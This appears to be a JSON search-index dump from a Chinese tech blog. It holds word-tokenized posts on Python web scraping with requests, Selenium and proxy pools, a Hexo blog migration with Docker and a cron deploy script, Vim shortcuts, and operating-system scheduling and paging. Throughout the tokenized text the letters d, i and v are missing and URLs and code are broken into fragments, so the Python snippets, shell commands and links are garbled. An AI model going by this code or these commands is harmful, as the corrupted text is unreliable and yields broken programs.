虫","还是","用户","。","url","=","'","http",":","httpbn",".","orgget","'","ata","=","&","#","123",";","'","name","'",":","'","germet","'",",","'","age","'",":","22","&","#","125",";","response","=","requests",".","get","(","url",",","ata","=","ata",")","#","或者","是","paramsprnt","(","response",".","text",")","克制","Ajax","和","JaaScrpt","使用","selenum","首先","要","安装","selenum","库","，","pp","nstall","selenum","-","https",":","pyp",".","tuna",".","tsnghua",".","eu",".","cnsmple","。","其次","，","如果","是","用","selenum","打开","Chrome","，","还","需要","安装","ChromeDrer","驱动","。","淘宝","源","ChromeDrer","驱动","链接","，","注意","版本","要","和","当前","Chrome","的","版本","一致","。","http",":","npm",".","taobao",".","orgmrrorschromerer","目前","Chrome","支持","的","浏览器","有","Safar","、","FreFox","、","Chrome","等","，","且","都","需要","安装","浏览器","驱动","。","selenum","会","自动","打开","浏览器","，","然后","渲染","出","网页","，","再","关闭","浏览器","，","这样","可以","克制","一切","JaaScrpt","渲染","，","如果","想","针对","Ajax","请求","，","可","以","用","Selenum","模拟","点击","效果","，","这里","只","介绍","基础","的","用法","。","from","selenum","mport","webrerurl","=","'","https",":","moe",".","ouban",".","comchart","'","opton","=","webrer",".","ChromeOptons","(",")","#","添加","Chrome","打开","的","选项","#","opton",".","a","_","argument","(","'","-","-","healess","'",")","#","执行","时","不","打开","了","浏览器","，","通常","在","没有","面板","的","Lnux","服务器","中","会","用到","rer","=","webrer",".","Chrome","(","optons","=","opton",")","rer",".","get","(","url",")","rer",".","close","(",")","#","关闭","浏览器","代理","IP","一个","IP","地址","对","服务器","过于","频繁的","访问","，","会","导致","服务器","屏蔽","你","的","IP","地址","。","爬虫","通常","使用","代理","IP","池","来","处理","自","己","IP","被","封","的","情况","。","可以","使用","Gthub","上","已经","写","好的","代理","池","https",":","gthub",".","comjhao","104","proxy","_","pool","url","=","'","https",":","moe",".","ouban",".","comchart","'","proxy","=","&","#","123",";","'","http","'",":","'","http",":","127.0.0.1",":","9743","'",",","'","https","'",":","'","https",":","127.0.0.1",":","9743","'","&","#","125",";","response","=","requests",".","get","(","url",",","proxes","=","proxy",")","prnt","(","response",".","status","_","coe",")","超时","设置","通常","用于","访问","一些","地方","较","远","的","网站","，","或者","访问","的","网站","当前","过于","繁忙","，","可以","设置","超时","。","一旦","请求","时间","超过","一定","的","值","，","服务器","还没有","返回","响应","，","那么","就","直接","退出","。","mport","requestsfrom","requests",".","exceptons","mport","ReaTmeouttry",":","response","=","requests",".","get","(","url",",","tmeout","=","0.2",")","except","ReaTmeout",":","prnt","(","'","Tmeout","'",")","prnt","(","response",".","status","_","coe",")","下载","文件","requests","还","可以","用来","下载","各种","文件","，","比如","图片","、","音乐","、","视频","等","。","这里","用","一个","例子","演示","一下","：","下载","《","雨幕","》","这","首","歌","：","mport","requestsurl","=","'","https",":","sharefs",".","yun",".","kugou",".","com","2019102113522","b","8","f","1","ce","854","a","7","f","401937583","ee","35","b","46","eG","172","M","000","D","14","jJQEAF","2","hoIGATyZ","4","ADq","0","jCqr","7","Q","097",".","mp","3","'","response","=","requests",".","get","(","url",")","#","这里","要","把","请求","头","送入","到","请求","方法","中","#","保存","到","文件","wth","open","(","'","雨幕",".","mp","3","'",",","'","wb","'",")","as","f",":","f",".","wrte","(","response",".","content",")","解析","网页","解析","网页","一般","用到","的","库","有","BeautfulSoup",",","PyQuery",",","re","，","BeautfulSoup","又","称之为","bs","4","，","要","区别","于","之前","的","bs","3","。","bs","4","和","PyQuery","类似","，","都是","通过","网页","的","节点","(","…","这样","的","东西","称之为","结点",")","来","定位","内容","的","。","而","re","是","直接","匹配","内容","，","更加","灵活","。","下面","是","re","匹配","表","，","虽然","多","，","但","通常","我们","只","需要","用到",".","*","?","这","三个","符号","。","re","正则","表达式","，","正则","就是","用","一些","具有","特殊","含义","的","符号","组合","到","一起","（","称为","正则","表达式","）","来","描述","字符","或者","字符串","的","方法","。","或者","说","：","正则","就是","用来","描述","一类","事物","的","规则","。","（","在","Python","中","）","它","内","嵌","在","Python","中","，","并","通过","re","模块","实现","。","正则","表达式","模式","被","编","译成","一系列","的","字节","码","，","然后","由","用","C","编写","的","匹配","引擎","执行","。","元","字符","匹配","内容","\\","w","匹配","字母","（","包含","中文","）","或","数字","或","下","划线","\\","W","匹配","非","字母","（","包含","中文","）","或","数字","或","下","划线","\\","s","匹配","任意","的","空白","符","\\","S","匹配","任意","非","空白","符","\\","匹配","数字","\\","D","匹配","非","数字","\\","A","从","字符串","开头","匹配","\\","z","匹配","字符串","的","结束","，","如果","是","换行","，","只","匹配","到","换行","前","的","结果","\\","n","匹配","一个","换行","符","\\","t","匹配","一个","制表符","^","匹配","字符串","的","开始","$","匹配","字符串","的","结尾",".","匹配","任意","字符","，","除了","换行","符","，","当","re",".","DOTALL","标记","被","指定","时","，","则","可以","匹配","包括","换行","符","的","任意","字符","。","[","…","]","匹配","字符","组","中的","字符","[","^","…","]","匹配","除了","字符","组","中的","字符","的","所有","字符","*","匹配","0个","或者","多","个","左边","的","字符","。","+","匹配","一个","或者","多","个","左边","的","字符","。","？","匹配","0个","或者","1个","左边","的","字符","，","非","贪婪","方式","。","{","n","}","精准","匹配","n","个","前面","的","表达式","。","{","n",",","m","}","匹配","n","到","m","次","由","前面","的","正则","表达式","定义","的","片段","，","贪婪","方式","(",")","匹配","括号","内","的","表达式","，","也","表示","一个","组","[",":","alnum",":","]","字母","和","数字","[",":","alpha",":","]","字母","[",":","asc",":","]","asc","字符","[",":","blank",":","]","空白","字符","[",":","cntrl",":","]","控制","字符","包括","换行","符","、","换","页符","、","退","格符","[",":","gt",":","]","数字","[",":","graph",":","]","非","控制","、","非","空格","字符","[",":","lower",":","]","小写","字母","[",":","prnt",":","]","可","打印","字符","[",":","punct",":","]","标点符号","字符","[",":","space",":","]","空白","字符","[",":","upper",":","]","大写字母","[",":","xgt",":","]","十六进制","数字","^","$","匹配","空行","词","首","词尾","pattern","整个","单词","重点","字符","含义","？","匹配","0个","或者","1个","左边","的","字符","，","非","贪婪","方式","。",".","匹配","任意","字符","，","除了","换行","符","。","*","匹配","*","号","前","的","字符","0次","或","多次","。",".","*","?","的","含义","就是","非","贪婪","匹配","前面","任意","字符","通常","采用","的","组合","#","re",".","comple","写","re","表达式","'","'","'","如果","不","使用","re",".","S","参数","，","则","只","在","每","一行","内","进行","匹配","，","如果","一行","没有","，","就","换","下","一行","重新","开始","。","而","使用","re",".","S","参数","以后","，","正则","表达式","会","将","这个","字符串","作为","一个","整体","，","在","整体","中","进行","匹配","。","'","'","'","parent","=","re",".","comple","(","'",".","*","?","页数",":",".","*","?","span","(",".","*","?",")","br","'",",","re",".","S",")","#","re",".","fnall","查找","html","的","内容","并","和","parent","匹配","，","返回","一个","列表","。","result","=","re",".","fnall","(","page","_","parent",",","html",")","项目","实战","爬","取","豆瓣","电影","榜","。","这个","会","用到","我们","之前","在","发起","请求","-","-","添加","请求","头","中","写","的","内容","，","这里","主要","关注","re","解析","的","过程","。","首选","选中","一个","tem","，","观察","它","在","源码","的","什么","位置","，","然后","折叠","源码","。","折叠","源码","后","，","可以","看到","选中","的","这些","都","十分相似","，","判断","一下","可知","，","他们","就是","每一部","电影","的","html","源码","。","这样","就","得","到了","电影","榜","单","的","一般","格式","。","依次","选取","关键字","，","用来","生成","re","表达式","。","我们","选中","了","`","table","wth",",","class","=","\"","tem","\"","class","=","\"","nbg","\"","ttle","`","这些","关键字","。","所以","，","re","表达式","是","：","#","用","括号","选出","你","需要","的","内容","pattern","=","re",".","comple","(","'","table",".","*","?","class","=","\"","tem","\"",".","*","?","nbg",".","*","?","ttle","=","\"","(",".","*","?",")","\"","'",",","re",".","S",")","选中","的","有些","内容","其实","并不","必要","，","我们","就","将它","去","除掉","了","。","具体","代码","如下","：","mport","requestsmport","reurl","=","'","https",":","moe",".","ouban",".","comchart","'","heaers","=","&","#","123",";","'","User","-","Agent","'",":","'","Mozlla","5.0","(","Wnows","NT","10.0",";","Wn","64",";","x","64",")","AppleWebKt","537.36","(","KHTML",",","lke","Gecko",")","Chrome","76.0.3809.132","Safar","537.36","'","&","#","125",";","#","请求","requestresponse","=","requests",".","get","(","url",",","heaers","=","heaers",")","html","=","response",".","text","#","解析","pattern","=","re",".","comple","(","'","table",".","*","?","class","=","\"","tem","\"",".","*","?","nbg",".","*","?","ttle","=","\"","(",".","*","?",")","\"","'",",","re",".","S",")","result","=","re",".","fnall","(","pattern",",","html",")","#","打印","prnt","(","result",")","结果","：","如果","想要","输出","更","美观","，","还","可以","添加","一些","字段","处理","等","："],"url":"http://ymlog.cn/2019/10/21/Python%E7%88%AC%E8%99%AB%E5%A4%A7%E7%BA%B2%E6%A6%82%E8%BF%B0/","title":"Python爬虫大纲概述","content":"基本原理爬虫的本质是：程序模拟浏览器，对服务器发起访问(requests请求过程)，服务器返回响应(response响应过程)。所以，一个简单的爬虫只有三步：\n\n构造URL\n对服务器发送请求\n输出服务器返回内容\n\n\n这里用一个实例，运...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E7%BC%96%E7%A8%8B/","name":"编程"},"date":"2019-10-21 12:37:03"},{"word":["在","2019年10月20日","之前","，","一","直","在","使用","叶落阁","的","主题","。","之后","换","到了","Clc","的","主题","，","期间","有","一系列","的","报","错","导致","Clc","的","主题","不能","部署","在","容器","中","，","所以","重","构","了","网站","结构","，","特此","纪念","。","或许","当","某一","天用","不习惯","Clc","的","主题","，","这篇文章","就","又","会","更新","了","。","叶落阁","主题","https",":","gthub",".","comyeloghexo","-","theme","-","3","-","hexo","这个","Hexo","的","内容","是","放","在","Lnux","主机","中的","，","然后","用","NFS","文件","共享","同步","到","Wnows","本地","。","只","需","在","Wnows","本地","编辑","，","即可","上传","。","Hexo","容器","生成","命令","：","ocker","run","-","-","-","name","my","-","hexo","-","p","80",":","4000","-","Log",":","opthexopple","1986","source","_","posts","pple","1986","hexo","我","还","开启","了","weaescope","监控","，","但","由于","端口","暴露","在外","面","，","别人","可以","轻而易举","的","访问","Lnux","主机","和","Docker","容器","，","所以","一般情况下","选择","禁用","。","suo","curl","-","L","gt",".","oscope","-","o","usrlocalbnscopesuo","chmo","a","+","x","usrlocalbnscopescope","launch","文件","传输","模式","Clc","主题","https",":","gthub",".","comSrceehexo","-","theme","-","Chc","#","ntroucton","在","使用","Hexo","这个","主题","时","，","我是","将","其","部署","在","ocker","中","，","但","ocker","中","hexo","的","版本","很","低","，","没有办法","，","只","好","换","了","方式","部署","。","[","root@~pple1986","]","#","hexo","-","hexo",":","3.3.7","hexo","-","cl",":","3.1.0","noe",":","10.16.3","文件","迁移","过程","：","现在","是","将","hexo","生成","静态","网页","，","然后","用","Ngnx","部署","。","在","wnows","本地","写","博客","，","然后","把","写","好的","博客","推","送到","Gthub","上","，","然后","在","服务器端","写","一个","脚本","，","每天","凌晨","一点","半","下载","Gthub","上","的","静态","页面","，","然后","存储","到","本地","usrsharengnxhtmlblog","下","。","这样","写","有","两点","好处","一","是","直接","访问","Gthub","托管","的","网站","，","用户","速度","会","很","慢","，","影响","使用","体验","而是","可以","用","Ngnx","，","对","访问","进行","监管","和","记录","，","达到","学习","Ngnx","的","目的","。","拉","取","Gthub","静态","网站","的","脚本","：","gt","clone","https",":","gthub",".","comArchKSArchKS",".","gthub",".","o",".","gt","blogrm","usrsharengnxhtmlblog","-","rfm","blog","usrsharengnxhtmlngnx","-","s","reloa","定时","任务",":","[","root@nk","mportant","]","#","crontab","-","l","30","1","*","*","*","bash","&","#","x","2","F",";","root","&","#","x","2","F",";","mportant","&","#","x","2","F",";","blog",".","sh","Pure","主题","2019年12月25日","，","圣诞节","，","换","了","个","主题","，","以前","用","的","Chc","的","主题","不用","了","，","换成","了","pure","的","主题","，","但","工作","原理","和","流程","和","上面","的","那个","一样","，","这里","就","不","过多","赘述","了","。","先","上图","纪念","一下","以前","用","的","那个","主题","：","也","打算","精简","一下","我","的","博客","内容","了","，","以前","是什么","笔记","都","网上","放","，","现在","尽量","放","一些","整理","的","东西","。"],"url":"http://ymlog.cn/2019/10/20/Hexo%E5%8D%9A%E5%AE%A2%E6%9E%B6%E6%9E%84%E8%BF%81%E7%A7%BB%E5%8E%86%E5%8F%B2/","title":"Hexo博客架构迁移历史","content":"在2019年10月20日之前，一直在使用叶落阁的主题。之后换到了Clic的主题，期间有一系列的报错导致Clic的主题不能部署在容器中，所以重构了网站结构，特此纪念。或许当某一天用不习惯Clic的主题，这篇文章就又会更新了。\n叶落阁主题...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/Linux/","name":"Linux"},"date":"2019-10-20 21:58:02"},{"word":["常用","命令","1","、","批量","加","注释","ctrl","+","，","进入","可视","块","模式","移动","光标","，","选中","的","位置","会","有","高亮","显示","shft","+","，","进入","nsert","模式","输入","esc","2","、","批量","解","注释","解","注释","光标","置于","行","首","ctrl","+","，","进入","可视","块","模式","移动","光标","，","选中","的","位置","会","有","高亮","显示","按","3","、","删除","命令行","模式","：",":","%","删除","所有","内容","末","行","模式","：","G","：","删除","光标","下","所有","内容","w","：","删除","一个","单词","4","、","移动","gg","：","光标","移到","第","一行","G","：","光标","移到","最后","一行","9","k","向上","移动","9次","，","同理","num","hjkl","5","、","退出","ZZ","保存","并","退出","，","行","末","模式","6","、","括号","跳转","%","7","、","滚","屏","CTRL","-","U","：","窗口","向上","滚动","半屏","CTRL","-","D","：","窗口","向下","滚动","半屏","CTRL","-","F","：","窗口","向下","滚动","全屏","CTRL","-","B","：","窗口","向上","滚动","全屏","zz","：","窗口","正中","zt","：","将","最","下面","的","窗口","调到","最","上面","zb","：","将","最","上面","的","窗口","调到","最","下面","8","、","查找","strng","#","查找","后","‘","#","’","：","往上","查找","‘","*","’","：","往下","查找","the","\\","精确","查找","，","确保","以","&","apos",";","the","&","apos",";","结尾","。","&","apos",";","\\","&","apos",";",":","开头","，","&","apos",";","\\","&","apos",";","：","结尾","9","、","多屏","编辑","m","a",".","sh","b",".","sh","-","O","#","垂直","Ctrl","+","w","：","跳转","qall","!",":","前置","退出","所有","10","、","替换","s","{","wor","1","}","{","wor","2","}","g",":","将","光标","所","在行的","所有","wor","1","替换","为","wor","2","%","s","{","wor","1","}","{","wor","2","}","g",":","将","所有","wor","1","替换","为","wor","2","g","表示","全局","替换","表示","大小","写","不","敏感","，","I","表示","大小","写","敏感","如","：","%","ssuosug","行","末","模式","a","光标","所在","下一个","位置","插入","A","光标","所","在行","末尾","插入","光标","所在位置","插入","I","光标","所","在行","首","插入","o","光标","所","在下","一行","插入","O","光标","所在","上","一行","插入","y","复制","p","粘贴","删除","一行","u","撤销","命令","模式","#","设置","行号","set","nu","#","取消","行号","set","nonu","#","下","划线","set","cursorlne","#","Tab","=","2个","空格","set","ts","=","2","#","忽略","大小写","set","gnorecase","#","不","忽略","大小写","set","nognorecase","输入","模式","定制","m","配置文件","：","全局","有效","全局","：","etcmrc","个人","：","~",".","mrc","行","末","：","对","当前","进程","有效","相关","配置","行号","：","显示","：","set","nu","取消","：","set","nonu","括号","匹配","：","匹配","：","set","showmatch","取消","：","set","unshowmatch","自动","缩进","：","启动","set","a","取消","：","set","noa","高亮","搜索","：","启动","set","hlsearch","取消","set","nohlsearch","语法","高亮","启动","syntax","on","取消","syntax","off","忽略","大小写","启动","set","c","取消","set","noc","获取","帮助","：","help"],"url":"http://ymlog.cn/2019/10/10/Vim%E5%BF%AB%E6%8D%B7%E9%94%AE/","title":"Vim快捷键","content":"常用命令\n1、批量加注释ctrl + v，进入可视块模式\n移动光标，选中的位置会有高亮显示\nshift + i，进入 insert 模式\n输入//\nesc2、批量解注释解注释\n光标置于行首\nctrl + v，进入可视块模式\n移动光标，...","author":"ZEN","categorie":{},"date":"2019-10-10 21:13:51"},{"word":["简介","Operaton","System","是","系统资源","的","管理者","，","在","有限","的","资源","内","，","通过","算法","，","完成","相对","合理的","分配","。","在","复杂的","硬件","环境","中","，","通过","封装","，","完成","动作","指令","的","抽象化","。","这","一切","的","基石","，","则","是","密集的","数据结构","和","算法","。","相对","合理","体现","在","：","调度","算法","实现","的","低","用户","响应","时间","和","紧急","事件","处理","虚拟","技术","实现","多用户","登录","IO","设备","控制器","尽可能","减少","CPU","调度","文件","目录","系统","屏蔽","了","数据","写入","物理","块","的","底层","细节","命令","接口","、","图形","接口","的","封装","相关","概念","并发","：","在","多","台","处理器","上","同时","处理","多","个","任务","并行","：","在","一台","处理器","上","宏观","上","同时","处理","多","个","任务","，","微观","上一个","时间段","只","处理","一个","任务","并发","进程","的","制约","关系","：","同步","和","互","斥","同步","：","同步","亦","称","直接","制约","关系","，","它是","指","为","完成","某种","任务","而","建立","的","两个","或","多","个","进程","，","这些","进程","因为","需要","在","某些","位置","上","协调","它们","的","工作","次序","而","等待","、","传递","信息","所","产生","的","制约","关系","。","进程","间","的","直接","制约","关系","就是","源于","它们","之间","的","相互","合作","。","互","斥","：","互","斥","亦","称","间接","制约","关系","。","当","一个","进程","进入","临界","区","使用","临界","资源","时","，","另一个","进程","必须","等待",",","当","占用","临界","资源","的","进程","退出","临界","区","后","，","另一","进程","才","允许","去","访问","此","临界","资源","。","异步","：","异步","是","进程","之间","彼此","独立","，","在","等待","其他","进程","的","运行","时","，","本","进程","继续","做","自己","的","事","，","不需要","等待","其他","进程","完成","后","再","工作","。","临界","资源","：","一次","仅","允许","一个","进程","使用","的","资源","管程","：","管程","在","功能","上","和","信号量","及","PV","操作","类似","，","属于","一种","进程","同步","互","斥","工具","符号","链接","：","是","文件","共享","的","一种","方式","，","允许","一个","文件","或","子目录","有","多","个","父","目录","，","但","其中","仅有","一个","座位","主父","目录","，","但","其他","几个","父","目录","都是","通过","符号","链接","方式","与之","相连","。","索引","结点","实现","文件","共享","：","在","文件","目录","中","只","设置","文件名","以及","指向","相应","索引","结点","的","指针","，","源文件","删除","后","，","会","出现","悬空","指针","。","工作","集","：","是","指","在","某","段","时间","间隔","∆","里","，","进程","实际","要","访问","的","页面","的","集合","。","抖动","：","如果","多道","程度","过高","，","页面","在","内存","与","外存","之间","频繁","调度","，","以至于","调度","页面","所","需","时间","比","进程","实际","运行","的","时间","还","多","，","此时","系统","效率","急剧","下降","，","甚至","导致","系统","崩溃","。","这种","现象","称为","颠簸","或","抖动","(","thrashng",")","相关","技术","虚拟","技术","复用","技术","中断","技术","封装","技术","相关","算法","双","标志","后","检查法","记录","型","信号量","机制","先","来","先","服务","算法","(","Frst","Come","Frst","Sere",")","短","作业","优先","(","Shortest","Job","Frst",")","高","响应","比","优先","(","Hghest","Response","Rato","Next",")","时间","片","轮转","调度","(","Roun","Robn",")","优先级","调度","算法","多级","反馈","调度","算法","一个","进程","从","被","创建","到","终止","，","其中","不得不","说的","故事","&","emsp",";","&","emsp",";","当","我们","打开","一个","程序","。","这个","程序","就","会","被","执行","。","因为","CPU","速度","非常","快","，","普通","硬盘","的","读写","速度","跟不上","CPU","的","速度","，","所以","我们","会","把","程序","调入","内存","中","执行","，","这样","就","产生","了","进程","。","&","emsp",";","&","emsp",";","如果","我们","同时","打开","多","个","应用","，","就","会","产生","多","个","进程","，","在","宏观","上","每一个","进程","在","CPU","内","同时","执行","(","并发",")","，","微观","上","每个","进程","在","CPU","内","交替","执行","，","同一个","处理机","同一","时间内","只能","执行","一个","进程","(","并行",")","。","&","emsp",";","&","emsp",";","由于","人们","的","需求","不一样","，","希望","有些","应用","执行","的","更","快","一点","，","就此","产生","了","进程","的","优先级","。","但","在","处理机","调度","算法","中","，","优先级","只是","决定","一个","进程","能够","被","分到","多少","运行","时间","的","指标","之一","，","还有","其他","的","指标","，","诸如","：","CPU","利用率","(","CPU","忙碌的","时间","作业","被","处理","所","需要","的","总","时间",")","，","系统","吞吐量","(","单位","时间内","完成","作业","的","数量",")","，","周转","时间","(","作业","从","被","提交","给","系统","到","最后","完成","所用","时间",")","，","响应","时间","(","用户","提出","请求","到","首次","响应","所用","的","时间","，","简而言之","，","就是","你","点击","一个","应用","，","系统","过","了","多","个","才","给你","打开",")","，","这些","也是","衡量","一个","处理机","调度","算法","优劣","的","指标","。","&","emsp",";","&","emsp",";","截止","到","现在","，","你","还是","只","点","了","一下","应用","，","电脑","界面","还","什么","都","没有","发生","。","当","你","点","下","鼠标","的","那","一刻","，","该","应用","(","下文","全部","用作","业","来","代替",")","会","被","装入","到","内存","，","但是","并不","是","全部","被","装入","内存","，","比如","打开","英雄","联盟","，","它","只","会","将","加载","页面","放入","内存","，","而","不会","把","对","战地","图","放入","内存","，","这样","有","一个","好处","就是","，","原本","8","G","的","League","of","Legens",",","现在","只","需要","不到","4","G","就","可以","带动","了","。","&","emsp",";","&","emsp",";","当","一个","作业","被","装入","内存","，","会","有","模块","链接","的","相关","步骤","，","但","现代","操作系统","一般","采用","运行","时","动态","链接","，","即","程序","执行","过程","中","需要","改","模块","时","，","才","对","它","进行","链接","。","而","在","以前","，","则","采用","静态","链接","，","即","在","程序","运行","之前","，","先","将","各个","目标","模块","及","它们","所","需","的","库函数","连接","成","一个","完整的","可执行文件","（","装入","模块","）","，","之后","不再","拆开","。","所以","这","一步","不再","是","程序","执行","的","第一步","了","，","写","到","这","，","程序","执行","的","第一步","即将","开始","，","那就是","动态","重","定位","装入","。","&","emsp",";","&","emsp",";","装入","就是","将","作业","装入","内存","，","其中","涉及到","很多","东西","，","比如","内存","如何","分","配给","作业","、","作业","执行","完","之后","如何","回收","内存","、","当","作业","太大","时","内存","如何","扩展","等","。","先","看","最","开始","的","—","—","如何","分配","内存","给","作业","。","&","emsp",";","&","emsp",";","现在","操作系统","一般","采用","离散","分配","的","方式","，","就是","将","作业","拆","成","很多","块","，","同时","将","内存","拆","成","很多","块","，","按照","非","连续","的","方式","，","将","作业","放入","内存","。","这样","可以","产生","较少","的","空间","碎片","。","一般的","分配","机制","采取","分页","存储","管理","、","分段","存储","管理","或者","段页","存储","管理","。","这时候","，","我们","的","LOL","的","一部分","(","可能","是","登录","界面",")","，","已经","被","拆","成","很多","块","，","塞","到","内存","页","中","了","。","下一步","就是","交给","CPU","执行","了","，","但","其实","还","缺少","了","一步","—","—","进程","创建","。","我们","一直","在","将它","如何","进入","内存","，","却","忘","了","给","它","创建","进程","，","但","现在","也","为时不晚","。","&","emsp",";","&","emsp",";","进程","创建","首先","要","向","操作系统","申请","空白","的","PCB","(","Process","Control","Block",")","，","获得","唯一","标识符","UID","，","然后","是","分配","资源","，","毕竟","进程","是","系统资源","调度","的","最小","单位","，","而","线程","则","是","处理机","调度","的","最小","单位","。","接着","初始化","PCB","信息","初始化","处理机","状态","信息","：","使","程序","计时器","指向","程序","的","入口","地址","，","使","指针","指向","栈项","，","初始化","处理机","控制","信息","：","设置","进程","状态","为","就绪","或者","静止","就绪","，","优先级","默认","为","最低","。","最后","终于","可以","将","进程","插入","就绪","队列","，","只","等","处理机","调度","了","。","虽然","程序","已经","做","了","这么","多事","，","但","现在","用户","还","是什么","也","看不到","，","当","用户","第一次","看到","反应","的","时候","，","就是","用户","响应","时间","(","前面","提到","过","的","处理机","调度","算法","的","指标",")","&","emsp",";","&","emsp",";","这个时候","可以","谈一谈","处理机","如何","调度","进程","的","，","这个","就是","进程","切换","。","得益于","优秀的","数据结构","，","处理机","实现","进程","切换","只","需要","把","PCB","(","进程","控制","模块",")","中的","相关","数据","进行","修改","。","比","如一个","进程","从","运行","态","切换","为","阻塞","态","，","处理","机会","根据","进程","标识符","UID","，","读取","进程","状态","，","将","进程","PCB","中的","状态","信息","修改","从","运行","修改","为","阻塞","，","同时","将","运行","环境","信息","存入","该","进程","的","PCB","中","，","再","把","该","进程","移到","阻塞","队列","队尾","，","选择","下一个","就绪","队列","的","进程","，","读取","其","PCB","中","CPU","的","运行","环境","，","然后","恢复","运行","环境","，","开始","执行","这个","进程","，","类似","同时","和","多","个人","聊微","信","时","的","状态","。","这里","会","产生","一个","问题","，","进程","并不","是","平等的","，","操作系统","会","希望","一些","进程","执行","的","更","快","，","一些","则","无所谓","。","这","就","像","同时","和","多","个人","聊微","信","，","对","女朋友","所","化","的","时间","总是","会","比","其他人","多","，","因为","有一些","人","、","或是","进程","的","优先级","总是","高于","其他","。","这","就","涉及","到了","处理机","调度","算法","，","这里","只","介绍","两种","算法","。","&","emsp",";","&","emsp",";","处理机","调度","算法","是","为了","更高","的","IO","，","更","快的","响应","时间","，","以及","更多","的","CPU","利用率","等等","。","时间","片","轮转","调度","算法","(","Roun","Robn",")","&","emsp",";","&","emsp",";","这种","算法","把","时间","切片","，","比如","在","一分钟","内","有","三个","进程","运行","。","处理机","划分","时间","片","为","100","ms","，","每隔","100","ms","切换","一次","进程","。","000","~","100","ms","：","执行","进程","A","1","100","~","200","ms","：","执行","进程","A","2","200","~","300","ms","：","执行","进程","A","3","300","~","400","ms","：","执行","进程","A","1","400","~","500","ms","：","执行","进程","A","2","500","~","600","ms","：","执行","进程","A","3",".",".",".",".",".",".",".",".","多级","反馈","调度","算法","&","emsp",";","&","emsp",";","(","说","实话","，","写","到","这里","我","已经","不想","写","了","，","为什么","我们","的","程序","还","没","执行",")","&","emsp",";","&","emsp",";","该","算法","划分","了","多","个","优先级","就绪","队列","以及","多种","时间","片","大小","，","优先","级","越","高","，","时间","片","越","小","。","当","一个","进程","产生","时","，","先","到","优先级","最高的","就绪","队列","执行","一个时间片","，","如果","作业","没有","执行","完","，","那么","就","进入","下一个","优先","级次","一级","的","队列","，","这时候","进来","的","进程","仍然","送往","第一","优先","级","队列","，","执行","一个时间片","，","然后","送往","第二","优先级","队列","。","如果","此时","没有","进程","，","则","执行","第二","优先级","队列","。","如果","作业","还没有","执行","完","，","则","放入","第三","优先级","队列","。","总结","：","1","、","设置","多级","就绪","队列","，","各级","队列","优先","级","从","高","到","低","、","时间","片","从小到大","2","、","新","进程","到达","时","，","先进","入","一级","队列","，","运行","结束","后","进入","下","一级","队列","队尾","，","到了","最","下","一级","，","就","重新","放回","该队","列队","尾","3","、","只","有","第","k","级","为","空","，","才","会","为","k","+","1级","队列","分配","时间","片","优点","：","1","、","对","各类","进程","相对","公平","（","FCFS","的","优点","）","2","、","每个","进程","到达","都","可以","很快","的","得到","响应","（","RR","优点","）","3","、","短","进程","只用","较少","的","时间","就","可以","完成","（","SPF","优点","）","4","、","不必","实现","估计","进程","的","运行","时间","（","避免","用户","作假","）","5","、","灵活的","调整","对","各类","进程","的","偏好","程度","，","IO","密集型","进程","（","将","因","IO","阻塞","的","进程","重新","放回","队列","）","&","emsp",";","&","emsp",";","我们","的","游戏","此时","还","在","就绪","队列","，","可能","就","在","多级","反馈","调度","算法","的","第","一个","队列","中","。","之后","，","该","进程","就","会","被","安排","上","处理机","执行","。","在","执行","的","过程","中","还","会","发生","一件","事","，","比如","你","进入","了","游戏","，","需要","加载","地图","界面","，","这时候","，","操作系统","就","会","发生","缺页","中断","，","缺页","中断","就是","要","访问","的","页","不在","主存","，","需要","操作系统","将","其","调入","主存","后","再","进行","访问","。","缺页","中断","、","请求","调页","和","页面","置换","是","实现","分页","请求","功能","的","三个","步骤","。","请求","分页","也","称为","页式","虚拟","存储","管理","，","是","建立","在","基本","分页","基础上","，","为了","能","支持","虚拟","存储器","功能","而","增加","了","请求","调页","功能","和","页面","置换","功能","其","基本","思想","是","：","在","进程","开始","运行","之前","，","不是","装入","全部","页面","，","而是","装入","部分","页面","，","之后","根据","进程","运行","的","需要","，","动态","装入","其他","页面","，","当","内存空间","已","满","，","又","需要","装入","新的","页面","时","，","根据","某种","算法","淘汰","某个","页面","，","以便","装进","新的","页面","。","&","emsp",";","&","emsp",";","实现","请求","分页","，","就","需要","解决","两个","问题","—","—","调出","和","调入","。","调出","调","哪里","的","页面","？","调出","现代","操作系统","一般","采用","可变","分配","全局","置换","，","进程","缺页时","，","只","允许","该","进程","在","内存","的","页面","中","选择","一页","换出","，","这样","就","不会","影响","其他","进程","运行","，","如果","该","进程","在","运行","过程","中","频繁的","中断","，","系统","再","为","该","进程","分配","若干","物理","块","。","调入","将","请求","分页","系统","的","外存","分为","两步","分","，","用于","存放","文件","区","和","用于","存放","对换","页面","的","对换","区","。","通常","，","对换","区","采取","连续","分配","的","方式","。","如果","系统","有","足够","的","空间","，","可以","全部","从","对换","区","调入","所","需","页面","。","如果","系统","缺少","足够","的","对换","区","空间","，","这时","，","凡是","不会","被","修改","的","文件","，","都","直接","从","文件","区","调入","；","而","当","换出","这些","页面","时","，","由于","未","被","修改","，","所以","不必","再","将","他们","换出","。","对于","那些","会","被","修改","的","文件","，","则","将","他们","调出","时","，","便","调到","对换","区","，","需要","时","，","再","从","对换","区","调入","。","页面","调入","的","过程","-","-","程序","所","要","访问","的","页面","不在","内存","-","-","CPU","发","出缺","页","中断","-","-","中断","处理","程序","保留","CPU","环境","，","分析","中断","原因","，","转入","中断","处理","-","-","查号页表","，","得到","该","页","的","外存","地址","判断","IF","{","内存","能","容纳","新页","}",":","启动","IO",",","将","所","缺页","调入","，","并","修改","页表","ELSE","{","内存","满","了","}",":","按照","某种","置换","算法","，","从","内存","中选","取","一页","准备","换出","判断","IF","{","准备","换出","的","这","一页","没有","被","修改","过","}",":","不必","写入","磁盘","ELSE","{","修改","过","}",":","则","必须","写入","磁盘","-","-","然后","把","所","缺页","调入","内存","，","并","修改","页表","中","相应","的","值","。","&","emsp",";","&","emsp",";","以上","实现","了","操作系统","的","虚拟","化","存储","，","以","便于","去","执行","那些","内存","大的","程序","。","当","操作系统","产生","了","一个","作业","的","执行","结果","，","它","会","将","执行","的","结果","通过","IO","设备","传输","给","用户","，","简而言之","就是","屏幕","。","那么","操作系统","是","如何","通过","屏幕","让","用户","看到","的","呢","？","而且","我们","玩","的","过程","中","所","敲","的","QWERDF","是","如何","被","操作系统","识别","的","呢","？","这个","就","设计","到了","操作系统","的","IO","管理","。","IO","管理","系统